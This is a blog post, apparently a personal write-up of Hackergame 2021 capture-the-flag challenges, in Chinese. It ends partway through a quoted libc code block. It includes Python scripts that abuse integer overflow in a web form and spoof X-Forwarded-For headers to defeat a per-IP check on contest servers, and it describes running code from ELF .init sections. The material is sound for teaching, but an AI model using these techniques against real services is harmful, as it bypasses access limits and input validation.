<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Hackergame 2021 a brief writeup   Hackergame 2021  签到 进制十六——参上 猫咪问答 Pro Max 卖瓜 透明的文件 旅行照片 FLAG 助力大红包 Amnesia  轻度失忆 记忆清除   图之上的信息 Easy RSA 赛博厨房 灯，等灯等灯  Level1   只读文件系统 卷王与野生的 GPA 助记词  第一顿大餐   minecRaft">
<meta property="og:type" content="article">
<meta property="og:title" content="Hackergame2021 Writeup">
<meta property="og:url" content="https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/index.html">
<meta property="og:site_name">
<meta property="og:description" content="Hackergame 2021 a brief writeup   Hackergame 2021  签到 进制十六——参上 猫咪问答 Pro Max 卖瓜 透明的文件 旅行照片 FLAG 助力大红包 Amnesia  轻度失忆 记忆清除   图之上的信息 Easy RSA 赛博厨房 灯，等灯等灯  Level1   只读文件系统 卷王与野生的 GPA 助记词  第一顿大餐   minecRaft">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/t2.png">
<meta property="og:image" content="https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/gpa.png">
<meta property="og:image" content="https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/r2.png">
<meta property="article:published_time" content="2021-11-04T00:48:56.000Z">
<meta property="article:modified_time" content="2021-11-22T16:22:13.616Z">
<meta property="article:author" content="Xia0o0o0o">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/t2.png">
    
    
      
        
          <link rel="shortcut icon" href="../../../../https:/avatars.githubusercontent.com/u/22996989?s=400&amp;u=18dec832f23e8e1d9f7097245cd5b955990979b8&amp;v=4">
        
      
      
        
          <link rel="icon" type="image/png" href="../../../../https:/avatars.githubusercontent.com/u/22996989?s=400&amp;u=18dec832f23e8e1d9f7097245cd5b955990979b8&amp;v=4" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="../../../../https:/avatars.githubusercontent.com/u/22996989?s=400&amp;u=18dec832f23e8e1d9f7097245cd5b955990979b8&amp;v=4">
        
      
    
    <!-- title -->
    <title>Hackergame2021 Writeup</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="../../../../css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="atom.xml" title="" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
      <!--
           -->
        <li>
          <span style="display: flex; align-items: center;">
            <title>
              Home
            </title>
            <svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.5 6.56062L8.00001 2.06062L3.50001 6.56062V13.5L6.00001 13.5V11C6.00001 9.89539 6.89544 8.99996 8.00001 8.99996C9.10458 8.99996 10 9.89539 10 11V13.5L12.5 13.5V6.56062ZM13.78 5.71933L8.70711 0.646409C8.31659 0.255886 7.68342 0.255883 7.2929 0.646409L2.21987 5.71944C2.21974 5.71957 2.21961 5.7197 2.21949 5.71982L0.469676 7.46963L-0.0606537 7.99996L1.00001 9.06062L1.53034 8.53029L2.00001 8.06062V14.25V15H2.75001L6.00001 15H7.50001H8.50001H10L13.25 15H14V14.25V8.06062L14.4697 8.53029L15 9.06062L16.0607 7.99996L15.5303 7.46963L13.7806 5.71993C13.7804 5.71973 13.7802 5.71953 13.78 5.71933ZM8.50001 11V13.5H7.50001V11C7.50001 10.7238 7.72386 10.5 8.00001 10.5C8.27615 10.5 8.50001 10.7238 8.50001 11Z" fill="currentColor"></path></svg>
              <a style="padding-left: 9px;" href="../../../../index.html">
                Home
              </a>
          </span>
        </li>
        <!--
           -->
        <li>
          <span style="display: flex; align-items: center;">
            <title>
              Writing
            </title>
            <svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path clip-rule="evenodd" d="M4.25 0C3.00736 0 2 1.00736 2 2.25V11V11.25V11.5C2 12.5252 2.61705 13.4062 3.5 13.792V11.5V11.25V11C3.5 10.4477 3.94772 10 4.5 10H12.5V11.2305V12.5H10.5V14H12.5H14V12.5V11.2305V10V8.5V0.75V0H13.25H4.25ZM12.5 8.5V1.5H4.25C3.83579 1.5 3.5 1.83579 3.5 2.25V8.70802C3.80623 8.57422 4.14445 8.5 4.5 8.5H12.5ZM5.5 11.5C5.22386 11.5 5 11.7239 5 12V16L7 14.75L9 16V12C9 11.7239 8.77614 11.5 8.5 11.5H5.5Z" fill="currentColor" fill-rule="evenodd"></path></svg>
              <a style="padding-left: 9px;" href="../../../../archives/">
                Writing
              </a>
          </span>
        </li>
        <!--
           -->
        <li>
          <span style="display: flex; align-items: center;">
            <title>
              Projects
            </title>
            <svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M1.80808 4.44191L2.25003 4.88386L3.13391 3.99997L2.69196 3.55803L1.63391 2.49997L2.69197 1.44191L3.13391 0.999972L2.25003 0.116089L1.80808 0.558031L0.484858 1.88126C0.143149 2.22296 0.143149 2.77698 0.484859 3.11869L1.80808 4.44191ZM12 0.999972H11.25V2.49997H12H13.5V11.75C13.5 12.7165 12.7165 13.5 11.75 13.5H4.25002C3.28353 13.5 2.50003 12.7165 2.50003 11.75V6.99997V6.24997H1.00003V6.99997V11.75C1.00003 13.5449 2.4551 15 4.25002 15H11.75C13.545 15 15 13.5449 15 11.75V1.74997V0.999972H14.25H12ZM7.75003 4.88386L8.19197 4.44191L9.51519 3.11869C9.8569 2.77698 9.8569 2.22296 9.51519 1.88126L8.19196 0.55803L7.75002 0.116089L6.86614 0.999973L7.30808 1.44191L8.36614 2.49997L7.30809 3.55803L6.86615 3.99997L7.75003 4.88386ZM4.13155 3.89688L4.02847 4.51535L5.26541 4.7215L5.36848 4.10303L5.86848 1.10303L5.97156 0.484566L4.73462 0.278409L4.63155 0.896878L4.13155 3.89688Z" fill="currentColor"></path></svg>
              <a style="padding-left: 9px;" href="../../../../https:/github.com/KpwnZ">
                Projects
              </a>
          </span>
        </li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="../CVE-2017-2370/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="../hello-world/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/&text=Hackergame2021 Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/&title=Hackergame2021 Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/&is_video=false&description=Hackergame2021 Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Hackergame2021 Writeup&body=Check out this article: https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/&title=Hackergame2021 Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/&title=Hackergame2021 Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/&title=Hackergame2021 Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/&title=Hackergame2021 Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/&name=Hackergame2021 Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kpwnz.github.io/2021/11/03/Hackergame2021-Writeup/&t=Hackergame2021 Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Hackergame 2021</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">1.1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E5%88%B6%E5%8D%81%E5%85%AD%E2%80%94%E2%80%94%E5%8F%82%E4%B8%8A"><span class="toc-number">1.2.</span> <span class="toc-text">进制十六——参上</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8C%AB%E5%92%AA%E9%97%AE%E7%AD%94-Pro-Max"><span class="toc-number">1.3.</span> <span class="toc-text">猫咪问答 Pro Max</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%96%E7%93%9C"><span class="toc-number">1.4.</span> <span class="toc-text">卖瓜</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%8F%E6%98%8E%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">1.5.</span> <span class="toc-text">透明的文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87"><span class="toc-number">1.6.</span> <span class="toc-text">旅行照片</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FLAG-%E5%8A%A9%E5%8A%9B%E5%A4%A7%E7%BA%A2%E5%8C%85"><span class="toc-number">1.7.</span> <span class="toc-text">FLAG 助力大红包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Amnesia"><span class="toc-number">1.8.</span> <span class="toc-text">Amnesia</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%BB%E5%BA%A6%E5%A4%B1%E5%BF%86"><span class="toc-number">1.8.1.</span> <span class="toc-text">轻度失忆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B0%E5%BF%86%E6%B8%85%E9%99%A4"><span class="toc-number">1.8.2.</span> <span class="toc-text">记忆清除</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BE%E4%B9%8B%E4%B8%8A%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">1.9.</span> <span class="toc-text">图之上的信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-RSA"><span class="toc-number">1.10.</span> <span class="toc-text">Easy RSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%9B%E5%8D%9A%E5%8E%A8%E6%88%BF"><span class="toc-number">1.11.</span> <span class="toc-text">赛博厨房</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%81%AF%EF%BC%8C%E7%AD%89%E7%81%AF%E7%AD%89%E7%81%AF"><span class="toc-number">1.12.</span> <span class="toc-text">灯，等灯等灯</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Level1"><span class="toc-number">1.12.1.</span> <span class="toc-text">Level1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AA%E8%AF%BB%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.13.</span> <span class="toc-text">只读文件系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B7%E7%8E%8B%E4%B8%8E%E9%87%8E%E7%94%9F%E7%9A%84-GPA"><span class="toc-number">1.14.</span> <span class="toc-text">卷王与野生的 GPA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A9%E8%AE%B0%E8%AF%8D"><span class="toc-number">1.15.</span> <span class="toc-text">助记词</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%A1%BF%E5%A4%A7%E9%A4%90"><span class="toc-number">1.15.1.</span> <span class="toc-text">第一顿大餐</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#minecRaft"><span class="toc-number">1.16.</span> <span class="toc-text">minecRaft</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fzuu"><span class="toc-number">1.17.</span> <span class="toc-text">fzuu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E6%98%9F%E4%BA%BA%E7%9A%84%E9%9F%B3%E6%B8%B8%E6%8E%8C%E6%9C%BA"><span class="toc-number">1.18.</span> <span class="toc-text">外星人的音游掌机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B6%85-OI-%E7%9A%84-Writeup-%E6%A8%A1%E6%8B%9F%E5%99%A8"><span class="toc-number">1.19.</span> <span class="toc-text">超 OI 的 Writeup 模拟器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9C%E7%84%B6%E8%BF%98%E6%98%AF%E9%80%86%E5%90%91%E6%AF%94%E8%BE%83%E7%AE%80%E5%8D%95%EF%BC%8C%E8%BF%99%E6%AC%A1%E6%B2%A1%E4%BA%BA%E4%B8%A4%E5%B0%8F%E6%97%B6%E6%89%8B%E5%81%9A%E4%BA%86%E5%90%A7"><span class="toc-number">1.19.1.</span> <span class="toc-text">果然还是逆向比较简单，这次没人两小时手做了吧</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Hackergame2021 Writeup
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Xia0o0o0o</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-11-04T00:48:56.000Z" class="dt-published" itemprop="datePublished">2021-11-03</time>
        
      
    </div>


      

      
    <div class="article-tag" style="text-decoration: none;">
        <i class="fa-solid fa-tag"></i>
        <a class="tag-category" href="../../../../tags/CTF/" rel="tag">CTF</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1>Hackergame 2021</h1>
<p>a brief writeup</p>
<!-- TOC -->
<ul>
<li><a href="#hackergame-2021">Hackergame 2021</a>
<ul>
<li><a href="#%E7%AD%BE%E5%88%B0">签到</a></li>
<li><a href="#%E8%BF%9B%E5%88%B6%E5%8D%81%E5%85%AD%E5%8F%82%E4%B8%8A">进制十六——参上</a></li>
<li><a href="#%E7%8C%AB%E5%92%AA%E9%97%AE%E7%AD%94-pro-max">猫咪问答 Pro Max</a></li>
<li><a href="#%E5%8D%96%E7%93%9C">卖瓜</a></li>
<li><a href="#%E9%80%8F%E6%98%8E%E7%9A%84%E6%96%87%E4%BB%B6">透明的文件</a></li>
<li><a href="#%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87">旅行照片</a></li>
<li><a href="#flag-%E5%8A%A9%E5%8A%9B%E5%A4%A7%E7%BA%A2%E5%8C%85">FLAG 助力大红包</a></li>
<li><a href="#amnesia">Amnesia</a>
<ul>
<li><a href="#%E8%BD%BB%E5%BA%A6%E5%A4%B1%E5%BF%86">轻度失忆</a></li>
<li><a href="#%E8%AE%B0%E5%BF%86%E6%B8%85%E9%99%A4">记忆清除</a></li>
</ul>
</li>
<li><a href="#%E5%9B%BE%E4%B9%8B%E4%B8%8A%E7%9A%84%E4%BF%A1%E6%81%AF">图之上的信息</a></li>
<li><a href="#easy-rsa">Easy RSA</a></li>
<li><a href="#%E8%B5%9B%E5%8D%9A%E5%8E%A8%E6%88%BF">赛博厨房</a></li>
<li><a href="#%E7%81%AF%E7%AD%89%E7%81%AF%E7%AD%89%E7%81%AF">灯，等灯等灯</a>
<ul>
<li><a href="#level1">Level1</a></li>
</ul>
</li>
<li><a href="#%E5%8F%AA%E8%AF%BB%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">只读文件系统</a></li>
<li><a href="#%E5%8D%B7%E7%8E%8B%E4%B8%8E%E9%87%8E%E7%94%9F%E7%9A%84-gpa">卷王与野生的 GPA</a></li>
<li><a href="#%E5%8A%A9%E8%AE%B0%E8%AF%8D">助记词</a>
<ul>
<li><a href="#%E7%AC%AC%E4%B8%80%E9%A1%BF%E5%A4%A7%E9%A4%90">第一顿大餐</a></li>
</ul>
</li>
<li><a href="#minecraft">minecRaft</a></li>
<li><a href="#fzuu">fzuu</a></li>
<li><a href="#%E5%A4%96%E6%98%9F%E4%BA%BA%E7%9A%84%E9%9F%B3%E6%B8%B8%E6%8E%8C%E6%9C%BA">外星人的音游掌机</a></li>
<li><a href="#%E8%B6%85-oi-%E7%9A%84-writeup-%E6%A8%A1%E6%8B%9F%E5%99%A8">超 OI 的 Writeup 模拟器</a>
<ul>
<li><a href="#%E6%9E%9C%E7%84%B6%E8%BF%98%E6%98%AF%E9%80%86%E5%90%91%E6%AF%94%E8%BE%83%E7%AE%80%E5%8D%95%E8%BF%99%E6%AC%A1%E6%B2%A1%E4%BA%BA%E4%B8%A4%E5%B0%8F%E6%97%B6%E6%89%8B%E5%81%9A%E4%BA%86%E5%90%A7">果然还是逆向比较简单，这次没人两小时手做了吧</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- /TOC -->
<h2 id="签到">签到</h2>
<p>观察可以发现<code>http://202.38.93.111:10000/?page=1</code>后面的参数<code>page</code>决定了现在的秒数，找个日期计算器即可</p>
<h2 id="进制十六——参上">进制十六——参上</h2>
<p><img src="t2.png" alt="Hex"><br>
复制下来找个Hex编辑器就可以了</p>
<h2 id="猫咪问答-Pro-Max">猫咪问答 Pro Max</h2>
<p>看起来主要是考察信息检索</p>
<ul>
<li>第一题使用 <a target="_blank" rel="noopener" href="https://web.archive.org">https://web.archive.org</a> 即可</li>
<li>第二题可以爆猜（不是），找到对应的网页即可（其实这题是很晚才做的，当时直接搜了一下在知乎找到了…）</li>
<li>第三题在 <a target="_blank" rel="noopener" href="https://lug.ustc.edu.cn/wiki/">https://lug.ustc.edu.cn/wiki/</a> 直接搜索“活动室”就能找到了</li>
<li>第四题找出论文，数一下有几张图</li>
<li>第五题找到对应的文档，command+F report就能找到是<code>/dev/null</code>（为什么呢）</li>
</ul>
<h2 id="卖瓜">卖瓜</h2>
<p>考虑 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>6</mn><mi>x</mi><mo>+</mo><mn>9</mn><mi>y</mi><mo>=</mo><mn>20</mn></mrow><annotation encoding="application/x-tex">6x+9y=20</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">6</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">9</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">20</span></span></span></span>，并且要求解全部都是正整数的情况下，是不可能的，那么极有可能是通过整数溢出来达到最终结果，考虑6是0110，那么通过连续移位和相加就能组合出0xFFFFFFFFFFFFFFF0，也就是-16，正好与结果相差36，是9的整数倍，把移位需要的系数计算出来submit即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">arr=[<span class="number">2305843009213693952</span>,<span class="number">576460752303423488</span>,<span class="number">144115188075855872</span>,<span class="number">36028797018963968</span>,<span class="number">9007199254740992</span>,<span class="number">2251799813685248</span>,<span class="number">562949953421312</span>,<span class="number">140737488355328</span>,<span class="number">35184372088832</span>,<span class="number">8796093022208</span>,<span class="number">2199023255552</span>,<span class="number">549755813888</span>,<span class="number">137438953472</span>,<span class="number">34359738368</span>,<span class="number">8589934592</span>,<span class="number">2147483648</span>,<span class="number">536870912</span>,<span class="number">134217728</span>,<span class="number">33554432</span>,<span class="number">8388608</span>,<span class="number">2097152</span>,<span class="number">524288</span>,<span class="number">131072</span>,<span class="number">32768</span>,<span class="number">8192</span>,<span class="number">2048</span>,<span class="number">512</span>,<span class="number">128</span>,<span class="number">32</span>,<span class="number">8</span>]</span><br><span class="line">url = <span class="string">&#x27;http://202.38.93.111:15003/&#x27;</span></span><br><span class="line">cook=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;aaa&#x27;</span>&#125;</span><br><span class="line">parg=&#123;<span class="string">&#x27;b6&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;b9&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;submit&#x27;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">    parg[<span class="string">&#x27;b6&#x27;</span>] = i</span><br><span class="line">    r = requests.post(url, data=parg, cookies=cook)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">parg[<span class="string">&#x27;b6&#x27;</span>] = <span class="number">0</span></span><br><span class="line">parg[<span class="string">&#x27;b9&#x27;</span>] = <span class="number">4</span></span><br><span class="line">requests.post(url, data=parg)</span><br></pre></td></tr></table></figure>
<h2 id="透明的文件">透明的文件</h2>
<p>看到这些[等符号就能想到这应该是ANSI转义序列，只要把<code>\e</code>添加在每个[前，打印出来就可以看到flag（为什么题目说劣质终端呢？可能是因为某些，比如cmd.exe里没法处理ANSI转移序列吧）</p>
<h2 id="旅行照片">旅行照片</h2>
<p>突破口在于图上的蓝色KFC，太显眼了，直接搜索蓝色KFC就可以找到，电话，地址都一并得到了，居然还是一个网红打卡地（）可以发现拍照位置在秦皇岛，通过影子猜测时间，然后通过街景确认左边的建筑物上的文字，楼层当时考虑到可能拍照的角度不同直接数会有点误差，就直接在控制台写脚本爆破了（其实就是懒得数）这个故事告诉我们不要乱发照片（）</p>
<h2 id="FLAG-助力大红包">FLAG 助力大红包</h2>
<p>简单解法：发送到各大群聊砍一刀（不是）<br>
通过助力信息可以发现，目标会检测前后端地址是否匹配，搜索一下后端检测地址的方法可以发现<code>X-Forwarded-For</code>这个关键点，而前端地址就在request data里，这样就可以写出脚本了（一开始没有看到/8都会被认为是同一个就直接random了，到最后几个一直报地址相同）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://202.38.93.111:10888/invite/f4883f59-edc4-4457-95f3-095113ad8b70&quot;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&quot;&#123;&#125;.0.0.0&quot;</span>.<span class="built_in">format</span>(a)</span><br><span class="line">    arg=&#123;<span class="string">&#x27;ip&#x27;</span>:<span class="built_in">str</span>&#125;</span><br><span class="line">    headers=&#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>:<span class="built_in">str</span>, <span class="string">&#x27;content-type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;</span><br><span class="line">    res=requests.post(url,data=arg,headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<h2 id="Amnesia">Amnesia</h2>
<h3 id="轻度失忆">轻度失忆</h3>
<p>这一个小问题比较简单，去掉<code>.data</code>段很明显还能通过立即数把参数传进去，直接<code>putchar</code>每个字符即可。</p>
<h3 id="记忆清除">记忆清除</h3>
<p>使用一些静态分析工具就能发现，一个ELF文件含有代码的地方不止有<code>.text</code>，还有<code>.init</code>，<code>.fini</code>等等地方，假如我们能把代码插入这些位置的话我们就能在没有<code>.text</code>的情况下执行代码了</p>
<p>将代码插入特定的<code>section</code>是简单的，通过<code>__attribute__ ((section (&quot;.init&quot;)))</code>就可以实现，接下来就是如何执行，看看<code>libc</code>源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __libc_init_array() &#123;</span><br><span class="line">    <span class="keyword">size_t</span> count, i;</span><br><span class="line">    </span><br><span class="line">    count = __preinit_array_end - __preinit_array_start;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">        __preinit_array_start[i]();</span><br><span class="line">    </span><br><span class="line">    _init();</span><br><span class="line"></span><br><span class="line">    count = __init_array_end - __init_array_start;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">        __init_array_start[i]();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __libc_fini_array() &#123;</span><br><span class="line">    <span class="keyword">size_t</span> count, i;</span><br><span class="line">    </span><br><span class="line">    count = __preinit_array_end - __preinit_array_start;</span><br><span class="line">    